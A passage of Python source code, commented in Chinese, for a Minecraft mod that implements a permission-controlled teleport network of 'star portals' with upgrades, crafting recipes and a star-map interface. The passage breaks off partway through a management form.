# -*- coding: utf-8 -*-
import math
import random

from ModSAPI.server.beta import *
from ModSAPI.serverui.beta import *

"""
数据结构（存储在 world 动态属性 elspirit:portals 中）:

{
    entityId: {
        entityId: entityId,
        id: int,
        name: string,
        color: int,
        scale: int,
        location: tuple[x, y, z, dimId],
        owner: playerId,
        usePermissions: "public" | "private" | playerName[],       # 谁可以使用（交互）此星塔
        teleportPermissions: "public" | "private" | playerName[],  # 谁可以传送至此星塔
        # permissions: 旧版单一字段，仅在读取时作向后兼容回退
        type: "core" | "sub",
        effects: { effectType: { level: int, enable: bool } },
        regionSize: int,
        enable: bool,
        nodes: { ... }   # 子节点，结构同上
    }
}

整体采用面向对象组织：
    Config            —— 常量与配置
    Geometry          —— 纯几何/排布工具
    Permissions       —— 权限判定
    StarTeam          —— 工会(星队)模组桥接
    EntityService     —— 实体/方块/AI 相关操作
    TeleportService   —— 统一的安全传送
    PortalRepository  —— 星塔数据的增删查改与持久化
    PermissionSection —— 表单中的权限编辑区块
    RecipeManager     —— 合成配方开关
    StarMapService    —— 星图（星座地图）数据与传送
    StarPortalSystem  —— 主系统：事件订阅、交互、表单、领域效果
"""


# ============================================================
# 配置
# ============================================================
class Config(object):
    PORTAL_PROPERTY = "elspirit:portals"
    PORTAL_ID_PROPERTY = "elspirit:portalId"
    PENDING_DELETE_PROPERTY = "portals_need_to_delete"
    DISABLE_RECIPES_PROPERTY = "star_portal.disableRecipes"
    LAST_CONTROLLER_USE_PROPERTY = "elspirit:lastUseController"
    INTERACTIONS_PROPERTY = "elspirit:interactions"

    CORE_ENTITY = "elspirit:core_portal"
    SUB_ENTITY = "elspirit:sub_portal"
    TEMP_ENTITY = "elspirit:temp_portal"
    PORTAL_ENTITIES = [CORE_ENTITY, SUB_ENTITY, TEMP_ENTITY]
    PORTAL_LIGHT_BLOCK = "sl:portal_light"

    CORE_ITEM = "elspirit:core_portal_item"
    SUB_ITEM = "elspirit:sub_portal_item"
    CONTROLLER_ITEM = "elspirit:stars_controller"
    NETHER_STAR = "minecraft:nether_star"

    CONTROLLER_COOLDOWN = 2400  # tick
    NODE_MIN_SEPARATION = 0.3   # 相邻小水晶端点之间的最小间距（方块）
    REGION_DEFAULT_SIZE = 4

    COLORS = [
        {"label": "蓝", "value": 0},
        {"label": "绿", "value": 2},
        {"label": "红", "value": 1},
        {"label": "黄", "value": 3},
        {"label": "浅紫", "value": 4},
        {"label": "浅蓝", "value": 5},
        {"label": "黑", "value": 6},
    ]  # type: list[DropdownItem]

    POSITIVE_EFFECTS = {
        "speed": "速度",
        "haste": "急迫",
        "strength": "力量",
        "jump_boost": "跳跃提升",
        "regeneration": "生命恢复",
        "resistance": "抗性",
        "fire_resistance": "火焰抗性",
        "water_breathing": "水下呼吸",
        "night_vision": "夜视",
        "health_boost": "生命提升",
        "absorption": "伤害吸收",
        "saturation": "饱和",
    }

    MOD_INFO = """
§b§l星塔模组§r提供了两种星塔水晶：§b§l主星塔（星核）§r和§b§l子星塔（微星石）§r。
玩家可以使用主星塔和子星塔建立一个星塔网络，在该网络内进行传送。

主星塔

使用物品星核后放置。点击（左键右键均可）即可在星塔附近出现星线，点击星线的终点虚影即可传送至对应节点。

同时，点击后，屏幕下方会显示一个管理按钮，点击即可设置星塔的信息（名称，颜色等），且会显示出一个传送点列表，点击即可传送至对应位置。

蹲下并点击主星塔也可以打开星塔管理菜单。

使用下界之星可以对星塔进行升级，升级后可以选择一个增益效果，主星塔网络内的玩家将获得该增益效果。

子星塔

使用物品微星石后放置。点击即可选择传送至主晶塔或设置星塔信息。


可以在管理员管理界面中启用配方，启用后玩家可以使用一个下界之星，四个钻石，四个紫水晶合成主晶塔，或使用四个紫水晶和一个钻石合成子晶塔。


ModSAPI提供模组支持
"""


# ============================================================
# 几何工具
# ============================================================
class Geometry(object):
    @staticmethod
    def declutterDirections(dirs, minSep, iterations=32):
        # type: (list[dict], float, int) -> None
        """就地分离一组共享同一原点的方向向量，使端点两两间距不小于 minSep。

        采用力导向松弛：对靠得过近的水晶沿连线方向相互推开，
        在尽量保留各自真实朝向的前提下消除重叠。
        """
        count = len(dirs)
        if count < 2:
            return
        minSepSq = minSep * minSep
        for _ in range(iterations):
            moved = False
            for i in range(count):
                for j in range(i + 1, count):
                    a = dirs[i]
                    b = dirs[j]
                    dx = a["x"] - b["x"]
                    dy = a["y"] - b["y"]
                    dz = a["z"] - b["z"]
                    distSq = dx * dx + dy * dy + dz * dz
                    if distSq >= minSepSq:
                        continue
                    dist = math.sqrt(distSq)
                    if dist < 1e-4:
                        # 两点几乎重合：按黄金角给一个确定性的水平偏移方向
                        angle = i * 2.39996
                        dx, dy, dz = math.cos(angle), 0.0, math.sin(angle)
                        dist = 1.0
                    push = (minSep - dist) / 2.0
                    ox = dx / dist * push
                    oy = dy / dist * push
                    oz = dz / dist * push
                    a["x"] += ox; a["y"] += oy; a["z"] += oz
                    b["x"] -= ox; b["y"] -= oy; b["z"] -= oz
                    moved = True
            if not moved:
                break


# ============================================================
# 权限判定
# ============================================================
class Permissions(object):
    PERMISSION_OPTIONS = [
        {"label": "公开", "value": 1},
        {"label": "私密", "value": 0},
        {"label": "指定玩家", "value": 2},
    ]

    @staticmethod
    def use(portalData):
        # type: (dict) -> str | list
        """谁可以使用此星塔（带旧字段回退）。"""
        if 'usePermissions' in portalData:
            return portalData['usePermissions']
        return portalData.get('permissions', 'public')

    @staticmethod
    def teleport(portalData):
        # type: (dict) -> str | list
        """谁可以传送至此星塔（带旧字段回退）。"""
        if 'teleportPermissions' in portalData:
            return portalData['teleportPermissions']
        return portalData.get('permissions', 'public')

    @staticmethod
    def check(permission, portalData, player):
        # type: (str | list, dict, Player) -> bool
        """对单个权限值进行校验，拥有者恒通过。"""
        if portalData['owner'] == player.id:
            return True
        if permission == 'public':
            return True
        if isinstance(permission, list) and player.name in permission:
            return True
        return False

    @classmethod
    def isUsable(cls, portalData, player):
        # type: (dict, Player) -> bool
        return cls.check(cls.use(portalData), portalData, player)

    @classmethod
    def canTeleportTo(cls, portalData, player):
        # type: (dict, Player) -> bool
        return cls.check(cls.teleport(portalData), portalData, player)

    @classmethod
    def isLinkable(cls, portalData, player):
        # type: (dict, Player) -> bool
        """是否可作为传送目的地被连接（子星塔不可作为父节点）。"""
        if portalData['type'] == 'sub':
            return False
        return cls.check(cls.teleport(portalData), portalData, player)


# ============================================================
# 工会（星队）模组桥接
# ============================================================
class StarTeam(object):
    @staticmethod
    def system():
        import mod.server.extraServerApi as serverApi
        teamSys = serverApi.GetSystem("ModSAPIForStarTeam", "system")
        if teamSys:
            return teamSys.importFunc("teamSys")
        return None

    @classmethod
    def available(cls):
        return cls.system() is not None

    @classmethod
    def addAnchor(cls, player, identifier, location):
        team = cls.system().getTeam(player)
        team.addTeleportAnchor(identifier, location, "portal")

    @classmethod
    def removeAnchor(cls, player, identifier):
        team = cls.system().getTeam(player)
        team.removeTeleportAnchor(identifier)


# ============================================================
# 实体 / 方块 / AI 服务
# ============================================================
class EntityService(object):
    @staticmethod
    def disableAI(portalId=None):
        import mod.server.extraServerApi as serverApi
        comp = serverApi.GetEngineCompFactory()
        if not portalId:
            for dimId in range(3):
                for portal in world.getDimension(dimId).getEntities():
                    if portal.typeId in Config.PORTAL_ENTITIES:
                        comp.CreateControlAi(portal.id).SetBlockControlAi(False)
        else:
            comp.CreateControlAi(portalId).SetBlockControlAi(False)

    @staticmethod
    def createTickingArea(portal):
        world.tickingAreaManager.createTickingArea(
            portal.id,
            {"dimension": portal.dimension, "from": portal.location, "to": portal.location})

    @staticmethod
    def clearPortalLight(portal):
        # type: (Entity) -> None
        loc = portal.location
        dimension = world.getDimension(portal.dimension.id)
        # 只清除星塔自己放置的光源方块，避免误删玩家的方块
        if dimension.getBlock(loc).typeId == Config.PORTAL_LIGHT_BLOCK:
            dimension.setBlockType(loc, "minecraft:air")


# ============================================================
# 统一安全传送
# ============================================================
class TeleportService(object):
    @staticmethod
    def safeLocation(player, location):
        # type: (Player, tuple) -> tuple
        """在目标点上方寻找一个不被方块阻挡的落点。"""
        saveHeight = 4
        for i in range(1, 4):
            block = player.dimension.getBlock((location[0], location[1] + i, location[2]))
            if block.typeId != "minecraft:air":
                saveHeight = i - 1
                break
        return (location[0] + 0.5, location[1] + saveHeight, location[2] + 0.5, location[3])

    @classmethod
    def teleport(cls, player, location):
        # type: (Player, tuple) -> None
        target = cls.safeLocation(player, location)

        def doTeleport():
            player.teleport(target, {"dimension": world.getDimension(target[3])})
            player.addEffect("slow_falling", 100, {"showParticle": False})
            system.sendToClient(player, "teleportEnd", target)
        system.runTimeout(doTeleport, 40)
        system.sendToClient(player, "teleport", player.location.getTuple())


# ============================================================
# 星塔数据仓库
# ============================================================
class PortalRepository(object):
    def load(self):
        # type: () -> dict
        return world.getDynamicProperty(Config.PORTAL_PROPERTY) or {}

    def save(self, data):
        # type: (dict) -> None
        world.setDynamicProperty(Config.PORTAL_PROPERTY, data)

    def nextId(self):
        # type: () -> int
        portalId = (world.getDynamicProperty(Config.PORTAL_ID_PROPERTY) or 0) + 1
        world.setDynamicProperty(Config.PORTAL_ID_PROPERTY, portalId)
        return portalId

    def list(self, data=None):
        # type: (dict | None) -> list[dict]
        if data is None:
            data = self.load()
        result = []

        def add(portalData):
            result.append(portalData)
            for node in portalData.get("nodes", {}).values():
                add(node)
        for portalData in data.values():
            add(portalData)
        return result

    def findById(self, portalId, data=None):
        # type: (int, dict | None) -> dict | None
        if data is None:
            data = self.load()
        for portalData in data.values():
            if portalData['id'] == portalId:
                return portalData
            result = self.findById(portalId, portalData.get("nodes", {}))
            if result:
                return result
        return None

    def findByEntityId(self, entityId, data=None):
        # type: (int, dict | None) -> dict | None
        if data is None:
            data = self.load()
        for key, portalData in data.items():
            if key == entityId:
                return portalData
            result = self.findByEntityId(entityId, portalData.get("nodes", {}))
            if result:
                return result
        return None

    def findParent(self, entityId, data=None):
        # type: (int, dict | None) -> dict | None
        """返回包含该实体id作为子节点的星塔（正确地递归整棵树）。"""
        if data is None:
            data = self.load()
        for portalData in data.values():
            if entityId in portalData.get("nodes", {}):
                return portalData
            result = self.findParent(entityId, portalData.get("nodes", {}))
            if result:
                return result
        return None

    def isAncestor(self, ancestor, node):
        # type: (dict, dict) -> bool
        """ancestor 是否为 node 自身或其祖先。"""
        if ancestor['id'] == node['id']:
            return True
        for child in ancestor.get("nodes", {}).values():
            if self.isAncestor(child, node):
                return True
        return False

    def delete(self, entityId, data=None):
        # type: (int, dict | None) -> bool
        if data is None:
            data = self.load()
        for key in list(data.keys()):
            if key == entityId:
                del data[key]
                return True
            if self.delete(entityId, data[key].get("nodes", {})):
                return True
        return False

    def linkablePortals(self, player, data=None):
        # type: (Player, dict | None) -> list[dict]
        result = []
        if data is None:
            data = self.load()
        for portalData in data.values():
            if Permissions.isLinkable(portalData, player):
                result.append(portalData)
            result += self.linkablePortals(player, portalData.get("nodes", {}))
        return result

    def repair(self, data=None, parent=None):
        # type: (dict | None, dict | None) -> None
        """重建缺失的星塔实体并修正数据键。只在最顶层持久化一次完整的树，
        避免把子树片段写回根属性。"""
        isRoot = data is None
        if data is None:
            data = self.load()
        for entityId in list(data.keys()):
            portalData = data[entityId]
            dimension = world.getDimension(portalData['location'][3])
            portal = world.getEntity(entityId)
            if not portal or not portal.isValid:
                portal = dimension.spawnEntity(
                    "elspirit:%s_portal" % portalData['type'], portalData['location'][:3:])
                EntityService.createTickingArea(portal)
                EntityService.disableAI(portal.id)
            portal.teleport(portalData['location'][:3:], {"dimension": dimension})
            if portalData['type'] == 'sub' and parent:
                portal.nameTag = "%s\n前往[%s]" % (portalData['name'], parent['name'])
            else:
                portal.nameTag = portalData['name']
            portal.setProperty("elspirit:color", portalData['color'])
            portal.setProperty("elspirit:scale", portalData['scale'])
            self.repair(portalData.get("nodes", {}), portalData)
            if portal.id != entityId:
                portalData['entityId'] = portal.id
                del data[entityId]
                data[portal.id] = portalData
        if isRoot:
            self.save(data)


# ============================================================
# 表单：权限编辑区块
# ============================================================
class PermissionSection(object):
    """在表单上渲染一个权限区块（下拉 + 指定玩家名编辑），
    通过 result() 在提交时取得最终权限值（"public" | "private" | list[str]）。"""

    def __init__(self, form, dropdownLabel, infoHeader, initialPermission):
        self._players = list(initialPermission) if isinstance(initialPermission, list) else []
        value = 1 if initialPermission == 'public' else 0 if initialPermission == 'private' else 2
        self._infoHeader = infoHeader
        self._permission = Observable.create(value, {"clientWritable": True})
        self._playerName = Observable.create("", {"clientWritable": True})
        self._visibility = Observable.create(value == 2, {"clientWritable": True})
        self._info = Observable.create(self._buildInfo())
        self._btnName = Observable.create("添加玩家")
        self._permission.subscribe(self._onPermissionChange)
        self._playerName.subscribe(self._onNameChange)
        form.dropdown(dropdownLabel, self._permission, Permissions.PERMISSION_OPTIONS)
        form.label(self._info, {"visible": self._visibility})
        form.textField("玩家名称", self._playerName, {"visible": self._visibility})
        form.button(self._btnName, self._addOrRemove, {"visible": self._visibility})

    def _buildInfo(self):
        info = self._infoHeader + "\n"
        for name in self._players:
            info += name + "\n"
        if not self._players:
            info += "无\n"
        return info

    def _onPermissionChange(self, value):
        self._visibility.setData(value == 2)

    def _onNameChange(self, value):
        self._btnName.setData("添加玩家" if value not in self._players else "§4移除玩家")

    def _addOrRemove(self):
        name = self._playerName.getData()
        if not name:
            return
        if name in self._players:
            self._players.remove(name)
        else:
            self._players.append(name)
        self._info.setData(self._buildInfo())
        self._playerName.setData("")

    def result(self):
        if self._permission.getData() == 2:
            return list(self._players)
        return ['private', "public"][self._permission.getData()]


# ============================================================
# 合成配方
# ============================================================
class RecipeManager(object):
    def _comp(self):
        import mod.server.extraServerApi as serverApi
        return serverApi.GetEngineCompFactory().CreateRecipe(serverApi.GetLevelId())

    def isEnabled(self):
        return bool(self._comp().GetRecipeResult(Config.CORE_ITEM))

    def initial(self):
        if world.getDynamicProperty(Config.DISABLE_RECIPES_PROPERTY):
            return
        comp = self._comp()
        comp.AddRecipe(self._coreRecipe())
        comp.AddRecipe(self._subRecipe())
        comp.AddRecipe(self._controllerRecipe())

    def setEnabled(self, enabled):
        world.setDynamicProperty(Config.DISABLE_RECIPES_PROPERTY, not enabled)
        if enabled:
            self.initial()
        else:
            comp = self._comp()
            comp.RemoveRecipe(Config.CORE_ITEM, "recipe_shaped")
            comp.RemoveRecipe(Config.SUB_ITEM, "recipe_shaped")
            comp.RemoveRecipe(Config.CONTROLLER_ITEM, "recipe_shaped")

    @staticmethod
    def _coreRecipe():
        return {"minecraft:recipe_shaped": {
            "description": {"identifier": Config.CORE_ITEM},
            "tags": ["crafting_table"],
            "pattern": ["P#P", "#S#", "P#P"],
            "key": {
                "#": {"item": "minecraft:diamond"},
                "P": {"item": "minecraft:amethyst_shard"},
                "S": {"item": "minecraft:gold_nugget"},
            },
            "result": [{"item": Config.CORE_ITEM}],
        }}

    @staticmethod
    def _subRecipe():
        return {"minecraft:recipe_shaped": {
            "description": {"identifier": Config.SUB_ITEM},
            "tags": ["crafting_table"],
            "pattern": [" # ", "#S#", " # "],
            "key": {
                "#": {"item": "minecraft:amethyst_shard"},
                "S": {"item": "minecraft:gold_nugget"},
            },
            "result": [{"item": Config.SUB_ITEM}],
        }}

    @staticmethod
    def _controllerRecipe():
        return {"minecraft:recipe_shaped": {
            "description": {"identifier": Config.CONTROLLER_ITEM},
            "tags": ["crafting_table"],
            "pattern": [" # ", "#S#", " # "],
            "key": {
                "#": {"item": "minecraft:amethyst_shard"},
                "S": {"item": "minecraft:compass"},
            },
            "result": [{"item": Config.CONTROLLER_ITEM}],
        }}


# ============================================================
# 星图（星塔星座地图）
# ============================================================
class StarMapService(object):
    def __init__(self, repo):
        self._repo = repo

    def buildPayload(self, player):
        # type: (Player) -> dict
        """收集该玩家可见（可传送至）的星塔，连同其在网络中的父节点id一起下发，
        供客户端绘制星座连线。"""
        portals = []

        def walk(nodeDict, parentId):
            for entityId, portalData in nodeDict.items():
                if entityId == "father" or not isinstance(portalData, dict):
                    continue
                if Permissions.canTeleportTo(portalData, player):
                    portals.append({
                        "id": portalData['id'],
                        "name": portalData['name'],
                        "color": portalData.get('color', 0),
                        "type": portalData['type'],
                        "location": portalData['location'],
                        "enable": portalData.get('enable', True),
                        "parentId": parentId,
                    })
                walk(portalData.get("nodes", {}), portalData['id'])
        walk(self._repo.load(), 0)
        loc = player.location
        return {"portals": portals, "center": [loc.x, loc.z], "dimId": player.dimension.dimId}

    def openFor(self, player):
        # type: (Player) -> None
        payload = self.buildPayload(player)
        if not payload['portals']:
            player.sendMessage("§c没有可显示的星塔！")
            return
        system.sendToClient(player, "openStarMap", payload)

    def onTeleport(self, arg):
        playerEntity = world.getEntity(arg.data['playerId'])
        if not playerEntity:
            return
        player = playerEntity.asPlayer()
        portalData = self._repo.findById(arg.data['portalId'])
        if not portalData:
            player.sendMessage("§c该星塔已不存在！")
            return
        if not portalData['enable']:
            player.sendMessage("§c此星塔已被禁用！")
            return
        if not Permissions.canTeleportTo(portalData, player):
            player.sendMessage("§c您没有权限传送至这个星塔！")
            return
        # 非管理员沿用星塔控制器的冷却，防止滥用快速传送
        if player.playerPermissionLevel != 2 and not self.checkCooldown(player):
            return
        TeleportService.teleport(player, portalData['location'])
        player.setDynamicProperty(Config.LAST_CONTROLLER_USE_PROPERTY, world.getAbsoluteTime())

    @staticmethod
    def checkCooldown(player):
        # type: (Player) -> bool
        lastTime = player.getDynamicProperty(Config.LAST_CONTROLLER_USE_PROPERTY) or 0
        current = world.getAbsoluteTime()
        if current - lastTime < Config.CONTROLLER_COOLDOWN:
            player.sendMessage("§c冷却中，剩余%d秒" % ((Config.CONTROLLER_COOLDOWN - (current - lastTime)) // 20))
            return False
        return True


# ============================================================
# 主系统
# ============================================================
class StarPortalSystem(object):
    def __init__(self):
        self.repo = PortalRepository()
        self.recipes = RecipeManager()
        self.starMap = StarMapService(self.repo)
        self._registerEvents()
        self.recipes.initial()
        system.runInterval(self.intervalFunc, 100)

    # ------------------------------------------------------------------
    # 事件订阅
    # ------------------------------------------------------------------
    def _registerEvents(self):
        world.afterEvents.playerSpawn.subscribe(self.onPlayerSpawn)
        world.beforeEvents.entityHurt.subscribe(self.onEntityHurtBefore)
        world.afterEvents.playerInteractWithEntity.subscribe(self.onInteract)
        world.afterEvents.itemStartUseOn.subscribe(self.onItemUseOn)
        world.afterEvents.entityDie.subscribe(self.onEntityDie)
        world.beforeEvents.chatSend.subscribe(self.onChatSend)
        system.afterEvents.clientEventReceive.subscribe("openStarPortalManager", self._onOpenManagerEvent)
        system.afterEvents.clientEventReceive.subscribe("starMapTeleport", self.starMap.onTeleport)

    # ------------------------------------------------------------------
    # 基础事件
    # ------------------------------------------------------------------
    def onPlayerSpawn(self, arg):
        # type: (PlayerSpawnAfterEvent) -> None
        self.stopInteraction(arg.player)
        if arg.initialSpawn:
            self.initialNodes()

    def onEntityHurtBefore(self, arg):
        # type: (EntityHurtBeforeEvent) -> None
        attacker = arg.damageSource.damagingEntity
        if not attacker or attacker.typeId != "minecraft:player":
            return
        self._dispatchInteract(attacker, arg.hurtEntity)

    def onInteract(self, arg):
        # type: (PlayerInteractWithEntityAfterEvent) -> None
        self._dispatchInteract(arg.player, arg.target)

    def _dispatchInteract(self, actor, target):
        typeId = target.typeId
        if typeId == Config.CORE_ENTITY:
            self.onInteractCorePortal(actor, target)
        elif typeId == Config.TEMP_ENTITY:
            self.onInteractTempPortal(actor, target)
        elif typeId == Config.SUB_ENTITY:
            self.onInteractSubPortalPre(actor, target)

    def onEntityDie(self, arg):
        # type: (EntityDieAfterEvent) -> None
        if arg.deadEntity.typeId in [Config.CORE_ENTITY, Config.SUB_ENTITY]:
            self.repo.repair()

    # ------------------------------------------------------------------
    # 主星塔交互
    # ------------------------------------------------------------------
    def onInteractCorePortal(self, player, portal):
        # type: (Player, Entity) -> None
        mainHand = player.mainHand
        holdingStar = bool(mainHand and mainHand.typeId == Config.NETHER_STAR)

        # 蹲下（且未手持下界之星）打开管理菜单
        if player.isSneaking and not holdingStar:
            portalData = self.repo.findByEntityId(portal.id)
            if not portalData:
                return
            if not Permissions.isUsable(portalData, player):
                player.sendMessage("§c您没有权限使用这个星塔！")
                return
            system.run(lambda: self.openStarPortalManager(player.id, portalData['id']))
            if player.getDynamicProperty(Config.INTERACTIONS_PROPERTY):
                return

        # 手持下界之星：升级
        if holdingStar:
            self._showUpgradeForm(player, portal)
            return

        # 已有交互：再次点击则关闭
        if player.getDynamicProperty(Config.INTERACTIONS_PROPERTY):
            self.stopInteraction(player, None)
            return

        portal.setDynamicProperty("elspirit:is_using", True)
        portalData = self.repo.findByEntityId(portal.id)
        if not portalData:
            self._showCorruptForm(player, portal, Config.CORE_ITEM)
            return
        portalId = portalData['id']
        if not Permissions.isUsable(portalData, player):
            player.sendMessage("§c您没有权限使用这个星塔！")
            return
        if not portalData['enable']:
            player.sendMessage("§c此星塔已被禁用！")
            return
        if not portalData['nodes'] and not self.repo.findParent(portal.id):
            player.sendMessage("没有可连接的星塔!")
            return

        # 是否有任意可到达的目的地
        canUse = False
        for node in portalData['nodes'].values():
            if Permissions.canTeleportTo(node, player):
                canUse = True
                break
        parent = self.repo.findParent(portal.id)
        if parent and Permissions.canTeleportTo(parent, player):
            canUse = True
        if not canUse:
            player.sendMessage("没有可连接的星塔!")
            return

        system.sendToClient(player, "spawnStarRegion", {
            "portalId": portalId,
            "location": portal.location.getTuple(),
            "shouldShowManager": portalData['owner'] == player.id})

        # 把父星塔以临时 "father" 节点的形式加入，使其也能作为传送终点显示
        if parent:
            portalData['nodes']["father"] = {
                "id": parent['id'],
                "name": parent['name'],
                "color": parent['color'],
                "scale": parent['scale'],
                "location": parent['location'],
                "owner": parent['owner'],
                "usePermissions": Permissions.use(parent),
                "teleportPermissions": Permissions.teleport(parent),
                "type": parent['type'],
                "nodes": {},
            }

        self._spawnStarNetwork(player, portal, portalData, portalId)

        if portalData['nodes'].get("father"):
            del portalData['nodes']["father"]

    def _spawnStarNetwork(self, player, portal, portalData, portalId):
        """生成星线与终点小水晶实体，并启动靠近检测定时器。"""
        def getMaxDistance(node, ori):
            maxLength = 0
            for subNode in node['nodes'].values():
                tar = {"x": subNode['location'][0], "y": subNode['location'][1], "z": subNode['location'][2]}
                d = {"x": tar["x"] - ori.x, "y": tar["y"] - ori.y, "z": tar["z"] - ori.z}
                length = math.sqrt(d["x"] ** 2 + d["y"] ** 2 + d["z"] ** 2)
                if length > maxLength:
                    maxLength = length
                subLength = getMaxDistance(subNode, ori)
                if subLength > maxLength:
                    maxLength = subLength
            return maxLength

        maxLength = getMaxDistance(portalData, portal.location)
        if maxLength <= 0:
            maxLength = 1.0  # 防止除零
        interactions = []

        def spawnNodes(ori, parentData):
            ori = {"x": ori.x, "y": ori.y, "z": ori.z}
            # 兄弟节点共享同一个原点 ori2
            ori2 = {
                "x": ori['x'],
                "y": (ori['y'] + 0.3 + parentData['scale'] * 0.2) if parentData['id'] == portalId else (ori['y'] + 0.15),
                "z": ori['z'],
            }
            minRadius = parentData['scale'] * 0.2
            # 第一步：算出每个可见节点相对原点的缩放方向向量
            visibleNodes = []
            for node in parentData['nodes'].values():
                if not Permissions.canTeleportTo(node, player):
                    continue
                tar = {"x": node['location'][0], "y": node['location'][1] + 0.3 + parentData['scale'] * 0.2, "z": node['location'][2]}
                d = {"x": tar["x"] - ori2['x'], "y": tar["y"] - ori2['y'], "z": tar["z"] - ori2['z']}
                d = {"x": d["x"] * 4.0 / maxLength, "y": d["y"] * 4.0 / maxLength, "z": d["z"] * 4.0 / maxLength}
                dirLength = math.sqrt(d["x"] ** 2 + d["y"] ** 2 + d["z"] ** 2)
                if 0 < dirLength < minRadius:
                    d = {
                        "x": d["x"] * minRadius / dirLength,
                        "y": d["y"] * minRadius / dirLength,
                        "z": d["z"] * minRadius / dirLength,
                    }
                visibleNodes.append({"node": node, "dir": d})
            # 第二步：分离过近的水晶，消除重叠
            Geometry.declutterDirections([item["dir"] for item in visibleNodes], Config.NODE_MIN_SEPARATION)
            # 第三步：生成实体与星线
            for item in visibleNodes:
                node = item["node"]
                d = item["dir"]
                entity = portal.dimension.spawnEntity(
                    Config.TEMP_ENTITY,
                    (ori2['x'] + d["x"], ori2['y'] + d["y"] - 0.15, ori2['z'] + d["z"]))
                entity.setDynamicProperty("elspirit:portalId", node['id'])
                entity.setDynamicProperty("elspirit:mainPortalEntityId", portal.id)
                entity.nameTag = "%s\n%s" % (node['name'], node['location'][:3:])
                entity.setProperty("elspirit:color", node['color'])
                interactions.append(entity.id)
                length = math.sqrt(d["x"] ** 2 + d["y"] ** 2 + d["z"] ** 2)
                system.sendToClient(player, "spawnStarLine", {
                    "molang": {
                        "size_x": length / 2.0,
                        "direction_x": d["x"],
                        "direction_y": d["y"],
                        "direction_z": d["z"],
                    },
                    "location": (ori["x"] + d["x"] / 2, ori2["y"] + d["y"] / 2, ori2["z"] + d["z"] / 2)})
                others = world.getAllPlayers()
                if player in others:
                    others.remove(player)
                system.sendToClient(others, "hideNode", entity.id)
                if node['nodes']:
                    spawnNodes(entity.location, node)

        spawnNodes(portal.location, portalData)

        def onInterval():
            if not portal or not portal.isValid:
                system.clearRun(timer)
                return
            shouldStop = True
            for p in world.getAllPlayers():
                vec = portal.location - p.location
                if math.sqrt(vec.x ** 2 + vec.y ** 2 + vec.z ** 2) < 15:
                    shouldStop = False
                    break
            if shouldStop:
                self.stopInteraction(player, portal)
                system.clearRun(timer)
        timer = system.runInterval(onInterval, 10)
        player.setDynamicProperty(Config.INTERACTIONS_PROPERTY, interactions)

    def stopInteraction(self, player, portal=None):
        # type: (Player, Entity | None) -> None
        if portal:
            portal.setDynamicProperty("elspirit:is_using", False)
        interactions = player.getDynamicProperty(Config.INTERACTIONS_PROPERTY)
        if interactions:
            system.sendToClient(player, "stopInteraction", None)
            for entityId in interactions:
                entity = world.getEntity(entityId)
                if entity:
                    entity.remove()
        player.setDynamicProperty(Config.INTERACTIONS_PROPERTY, [])

    def _showUpgradeForm(self, player, portal):
        data = self.repo.load()
        portalData = self.repo.findByEntityId(portal.id, data)
        if not portalData:
            return
        if portalData['owner'] != player.id:
            player.sendMessage("§c您没有权限升级这个星塔！")
            return
        addedEffects = portalData.get("effects", {})
        effects = []  # type: list[DropdownItem]
        index = 0
        for effect in Config.POSITIVE_EFFECTS:
            if effect not in addedEffects:
                effects.append({"label": Config.POSITIVE_EFFECTS[effect], "value": index, "extra": effect})
                index += 1
        if not effects:
            player.sendMessage("§e该星塔已拥有全部增益效果！")
            return
        effectSelection = Observable.create(0, {"clientWritable": True})
        levelSelection = Observable.create(1, {"clientWritable": True})

        def submit():
            effectType = effects[effectSelection.getData()]["extra"]
            level = levelSelection.getData() - 1
            addedEffects[effectType] = {"level": level, "enable": True}
            portalData['effects'] = addedEffects
            self.repo.save(data)
            menu.close()
            player.sendMessage("§a升级成功！")
            player.runCommand("playsound random.levelup @s")
            item = player.mainHand
            item.amount -= 1
            player.mainHand = item
        menu = CustomForm.create(player, "升级星塔")
        menu.label("升级后可以下蹲点击星塔，打开管理界面，以选择增益或调整范围大小。\n ")
        menu.dropdown("选择一个增益效果", effectSelection, effects)
        menu.slider("选择增益等级", levelSelection, 1, 5)
        menu.button("升级", submit)
        menu.show()

    def _showCorruptForm(self, player, portal, refundItem):
        """数据损坏（父节点丢失）时，提示玩家删除并返还物品。"""
        def delete():
            form.close()
            EntityService.clearPortalLight(portal)
            portal.remove()
            player.container.addItem(ItemStack(refundItem, 1))
        form = CustomForm.create(player, "错误")
        form.label("数据发生错误，可能是父节点被移除。")
        form.label("是否删除该晶塔？")
        form.button("删除", delete)
        form.button("取消", form.close)
        form.show()

    # ------------------------------------------------------------------
    # 临时（终点）星塔交互
    # ------------------------------------------------------------------
    def onInteractTempPortal(self, player, portal):
        # type: (Player, Entity) -> None
        portalData = self.repo.findById(portal.getDynamicProperty("elspirit:portalId"))
        if not portalData:
            print("Error in temp portal interaction!")
            return
        if not Permissions.canTeleportTo(portalData, player):
            player.sendMessage("§c您没有权限传送至这个星塔！")
            return
        self.stopInteraction(player, world.getEntity(portal.getDynamicProperty("elspirit:mainPortalEntityId")))
        if not portalData['enable']:
            player.sendMessage("§c此星塔已被禁用！")
            return
        TeleportService.teleport(player, portalData['location'])

    # ------------------------------------------------------------------
    # 子星塔交互
    # ------------------------------------------------------------------
    def onInteractSubPortalPre(self, player, portal):
        # type: (Player, Entity) -> None
        data = self.repo.load()
        portalData = self.repo.findByEntityId(portal.id, data)
        if not portalData:
            self._showCorruptForm(player, portal, Config.SUB_ITEM)
            return
        if not Permissions.isUsable(portalData, player):
            player.sendMessage("§c您没有权限使用这个星塔！")
            return

        def teleport():
            self.onInteractSubPortal(player, portal)
            actions.close()

        def manage():
            if portalData['owner'] != player.id:
                player.sendMessage("§c您没有权限管理这个星塔！")
                return
            actions.close()
            self._showSubPortalManager(player, portal, portalData, data)

        actions = CustomForm.create(player, "子星塔")
        actions.button("传送", teleport, {"visible": portalData['enable']})
        actions.button("管理", manage)
        actions.show()

    def _showSubPortalManager(self, player, portal, portalData, data):
        portalName = Observable.create(portalData['name'], {"clientWritable": True})
        portalScale = Observable.create(portalData['scale'], {"clientWritable": True})
        portalColor = Observable.create(portalData['color'], {"clientWritable": True})
        linkableNodes = []  # type: list[DropdownItem]
        for node in self.repo.linkablePortals(player):
            if not self.repo.isAncestor(portalData, node):
                linkableNodes.append({"label": node['name'], "value": node['id']})
        parentData = self.repo.findParent(portal.id)
        parentNode = Observable.create(parentData['id'] if parentData else 0, {"clientWritable": True})
        isEnabled = Observable.create(portalData['enable'], {"clientWritable": True})

        manager = CustomForm.create(player, "星塔管理")
